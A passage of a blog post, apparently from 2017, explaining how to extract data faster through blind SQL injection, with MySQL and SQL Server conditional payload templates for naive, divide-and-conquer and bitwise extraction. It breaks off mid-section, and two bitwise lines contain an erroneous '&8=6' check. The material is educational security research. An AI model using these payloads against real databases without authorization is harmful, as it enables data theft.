@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Blind SQL injection optimization | Alex Chapman’s Blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="Blind SQL injection optimization" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="In this post I examine techniques and optimizations which can be used to efficiently extract SQL query results from Blind SQL Injection vulnerabilities. With the correct techniques and optimizations the majority of SQL query results can be extracted using at most two requests per character in the result string plus two requests for a length check. Under certain conditions results may be able to be extracted using significantly fewer requests. This post draws together known Blind SQL Injection data extraction techniques and builds upon them in order to reduce the number of requests required to extract query results to the absolute minimum." />
+<meta property="og:description" content="In this post I examine techniques and optimizations which can be used to efficiently extract SQL query results from Blind SQL Injection vulnerabilities. With the correct techniques and optimizations the majority of SQL query results can be extracted using at most two requests per character in the result string plus two requests for a length check. Under certain conditions results may be able to be extracted using significantly fewer requests. This post draws together known Blind SQL Injection data extraction techniques and builds upon them in order to reduce the number of requests required to extract query results to the absolute minimum." />
+<link rel="canonical" href="https://ajxchapman.github.io/security/2017/01/14/blind-sql-injection.html" />
+<meta property="og:url" content="https://ajxchapman.github.io/security/2017/01/14/blind-sql-injection.html" />
+<meta property="og:site_name" content="Alex Chapman’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2017-01-14T00:00:00-06:00" />
+<script type="application/ld+json">
+{"description":"In this post I examine techniques and optimizations which can be used to efficiently extract SQL query results from Blind SQL Injection vulnerabilities. With the correct techniques and optimizations the majority of SQL query results can be extracted using at most two requests per character in the result string plus two requests for a length check. Under certain conditions results may be able to be extracted using significantly fewer requests. This post draws together known Blind SQL Injection data extraction techniques and builds upon them in order to reduce the number of requests required to extract query results to the absolute minimum.","mainEntityOfPage":{"@type":"WebPage","@id":"https://ajxchapman.github.io/security/2017/01/14/blind-sql-injection.html"},"url":"https://ajxchapman.github.io/security/2017/01/14/blind-sql-injection.html","@type":"BlogPosting","headline":"Blind SQL injection optimization","dateModified":"2017-01-14T00:00:00-06:00","datePublished":"2017-01-14T00:00:00-06:00","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+  </head>
+  <body>
+
+      <header class="page-header" role="banner">
+        <a href="/">
+        <h1 class="project-name">Alex Chapman's Blog</h1>
+        <h2 class="project-tagline">A tech blog about all things bug bounty, security and development.
+</h2>
+        </a>
+      </header>
+
+    <main id="content" class="main-content" role="main">
+      
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    
+
+
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="postheader">
+    <a href="/">Home</a>
+  </div>
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">Blind SQL injection optimization</h1>
+    <p class="post-meta">
+      <time datetime="2017-01-14T00:00:00-06:00" itemprop="datePublished">
+        2017-01-14
+      </time>
+      
+        • <span itemprop="category">Security</span>
+      
+  </header>
+  <div class="post-content" itemprop="articleBody">
+    <p>In this post I examine techniques and optimizations which can be used to efficiently extract SQL query results from Blind SQL Injection vulnerabilities. With the correct techniques and optimizations the majority of SQL query results can be extracted using at most two requests per character in the result string plus two requests for a length check. Under certain conditions results may be able to be extracted using significantly fewer requests.</p>
+
+<p>This post draws together known Blind SQL Injection data extraction techniques and builds upon them in order to reduce the number of requests required to extract query results to the absolute minimum.</p>
+
+<!--more-->
+
+<p>Blind SQL Injection is a type of SQL Injection vulnerability whereby only a <code class="highlighter-rouge">true</code> or <code class="highlighter-rouge">false</code> result can be determined from the database +<a href="https://www.owasp.org/index.php/Blind_SQL_Injection">OWASP Blind SQL Injection</a>. If SQL Injection or Blind SQL Injection are not familiar to you I suggest starting with some introductory material (such as +<a href="https://www.troyhunt.com/everything-you-wanted-to-know-about-sql/">Everything you wanted to know about SQL injection by Troy Hunt</a>) before continuing this post.</p>
+
+<p>In the examples throughout this post I will present MySQL (MySQL and MariaDB) and SQL Server syntax. All techniques should work fine on other SQL database engines, however the syntax may need modifying slightly.</p>
+
+<h1 id="data-extraction">Data extraction</h1>
+<p>When considering extracting data from Blind SQL injection vulnerabilities the cost of data extraction needs to be considered. Primarily the cost of extracting data is the number of requests required to perform the data extraction, a secondary cost (not necessarily related to the number of requests) is the amount of time data extraction will take. The techniques outlined below aim to increasingly reduce the number of requests required for data extraction.</p>
+
+<h2 id="naïve-byte-extraction">Naïve byte extraction</h2>
+<p>The simplest naïve data extraction technique is to extract the query result data byte by byte by testing each byte of the result against the full set of 256 possible values for that byte. As an example it could be implemented using the following SQL statements:
+<code class="highlighter-rouge">MySQL</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">0</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">1</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">2</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="p">...</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">255</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+</code></pre></div></div>
+<p><code class="highlighter-rouge">SQL Server</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">0</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">1</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">2</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="p">...</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">255</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+</code></pre></div></div>
+<p>Where <code class="highlighter-rouge">(xxx)</code> is the query we want to make.</p>
+
+<p>The worst case for naïve byte extraction (with no optimizations) is 256 requests per byte, although in practice this would very rarely be the case. This is obviously terrible and no one would actually use this, but it is good to have a “worst case” starting point when considering improved techniques.</p>
+
+<h2 id="divide-and-conquer-byte-extraction">Divide and conquer byte extraction</h2>
+<p>The divide and conquer algorithm +<a href="https://en.wikipedia.org/wiki/Divide_and_conquer_algorithm">Divide and conquer algorithm</a> recursively splits a search space in two, checking which sub-set the result falls into until there is only one value remaining. It could be implemented using the following SQL statements:
+<code class="highlighter-rouge">MySQL</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&lt;</span><span class="mi">128</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&lt;</span><span class="mi">64</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&lt;</span><span class="mi">96</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&lt;</span><span class="mi">80</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&lt;</span><span class="mi">72</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&lt;</span><span class="mi">68</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&lt;</span><span class="mi">66</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&lt;</span><span class="mi">67</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+</code></pre></div></div>
+<p><code class="highlighter-rouge">SQL Server</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">128</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">64</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">96</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">80</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">72</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">68</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">66</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">67</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+</code></pre></div></div>
+<p>Where <code class="highlighter-rouge">(xxx)</code> is the query we want to make.</p>
+
+<p>Each byte extracted using the divide and conquer requires 8 requests, this is already significant improvement over the naïve byte extraction method. However, requests cannot be parallelized per byte as each request (baring the first) depends on the result of the previous request so must be performed in serial.</p>
+
+<h2 id="bitwise-byte-extraction">Bitwise byte extraction</h2>
+<p>To improve request parallelization we can use the bitwise byte extraction techniques. For this technique we simply test each bit of each byte we wish to extract, the result will either be a <code class="highlighter-rouge">1</code> or a <code class="highlighter-rouge">0</code> which map to our <code class="highlighter-rouge">true</code> or <code class="highlighter-rouge">false</code> query responses:
+<code class="highlighter-rouge">MySQL</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&amp;</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&amp;</span><span class="mi">2</span><span class="o">=</span><span class="mi">2</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&amp;</span><span class="mi">4</span><span class="o">=</span><span class="mi">4</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&amp;</span><span class="mi">8</span><span class="o">=</span><span class="mi">6</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&amp;</span><span class="mi">16</span><span class="o">=</span><span class="mi">16</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&amp;</span><span class="mi">32</span><span class="o">=</span><span class="mi">32</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&amp;</span><span class="mi">64</span><span class="o">=</span><span class="mi">64</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="n">ORD</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="nb">BINARY</span><span class="p">((</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">&amp;</span><span class="mi">128</span><span class="o">=</span><span class="mi">128</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+</code></pre></div></div>
+<p><code class="highlighter-rouge">SQL Server</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">2</span><span class="o">=</span><span class="mi">2</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">4</span><span class="o">=</span><span class="mi">4</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">8</span><span class="o">=</span><span class="mi">6</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">16</span><span class="o">=</span><span class="mi">16</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">32</span><span class="o">=</span><span class="mi">32</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">64</span><span class="o">=</span><span class="mi">64</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+<span class="k">CASE</span> <span class="k">WHEN</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">binary</span><span class="p">,</span> <span class="p">(</span><span class="n">xxx</span><span class="p">)),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">128</span><span class="o">=</span><span class="mi">128</span> <span class="k">THEN</span> <span class="mi">1</span> <span class="k">ELSE</span> <span class="mi">0</span> <span class="k">END</span>
+</code></pre></div></div>
+<p>Where <code class="highlighter-rouge">(xxx)</code> is the query we want to make.</p>
+
+<p>We can then reconstruct the bits into the resulting byte. As with the divide and conquer technique bitwise byte extraction requires 8 requests per byte, however the requests can be parallelized, no single request depends on the result of a previous request.</p>
+
+<h2 id="a-note-on-result-data-length">A note on result data length</h2>
+<p>One thing we have to consider when extracting result data is when to stop, there is no point attempting to extract 128 bytes of a 10 byte long query result. There are two obvious methods for doing this. The first is to extract the length of the result before we start to extract any data. This can be done using the <code class="highlighter-rouge">LENGTH</code> function for MySQL or the <code class="highlighter-rouge">LEN</code> function on SQL Server. We can then use divide and conquer or bitwise byte extraction to extract the length before starting to extract the query data. The second method is to keep extracting data until we hit a <code class="highlighter-rouge">null</code> byte (0x00). The MySQL <code class="highlighter-rouge">SUBSTR</code> function returns the empty string <code class="highlighter-rouge">''</code> if the <code class="highlighter-rouge">position</code> argument is outside the length of the <code class="highlighter-rouge">str</code> input string argument, similarly the SQL Server <code class="highlighter-rouge">SUBSTR</code> function will return <code class="highlighter-rouge">null</code> if the <code class="highlighter-rouge">start</code> argument is outside the length of the <code class="highlighter-rouge">expression</code> input string argument. We can use this <code class="highlighter-rouge">null</code> response as a flag to stop extracting data.</p>
+
+<p>The <code class="highlighter-rouge">null</code> character length check scales better with longer result strings and can be optimized more heavily than extracting the length of the data up front. The one area <code class="highlighter-rouge">null</code> checks will fall down is if we are extracting data with <code class="highlighter-rouge">null</code> bytes in, e.g. binary data. For these cases upfront data length checking is required.</p>
+
+<p>The number of requests required to perform a <code class="highlighter-rouge">null</code> character length check will be the same as the number of requests required to check a single character, with bitwise byte extraction this would be 8 requests. Upfront data length checking fewer or more requests depending on the length of the query result.</p>
+
+<h1 id="optimizations">Optimizations</h1>
+<h2 id="character-set-optimizations">Character set optimizations</h2>
+<h3 id="ascii-character-extraction">ASCII character extraction</h3>
+<p>In the above examples we extract full bytes from the query result. This is fine if we are attempting to extract binary data from the database, but more often than not we will be extracting text data. If we expect the result to be represented by non-extended ASCII characters we can perform simple character extraction rather than byte extraction. ASCII represents the characters of the English alphabet, numbers, punctuation and control characters. Each ASCII character can be represented using 7 bits, which reduces the number of requests required per character to 7 compared to 8 for byte extraction.</p>
+
+<p><code class="highlighter-rouge">MySQL</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ASCII</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">((</span><span class="n">xxx</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">SQL Server</code></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ASCII</span><span class="p">(</span><span class="k">SUBSTRING</span><span class="p">((</span><span class="n">xxx</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span>
+</code></pre></div></div>
+<p>Where <code class="highlighter-rouge">(xxx)</code> is the query we want to make.</p>
+
+<p>Obviously if we need to consider extended character sets this optimization will not be applicable.</p>
+
+<h3 id="character-set-reduction">Character set reduction</h3>
+<p>Building on the ASCII character extraction optimization, we can reduce the character set from ASCII to a smaller arbitrary character set, e.g.:</p>
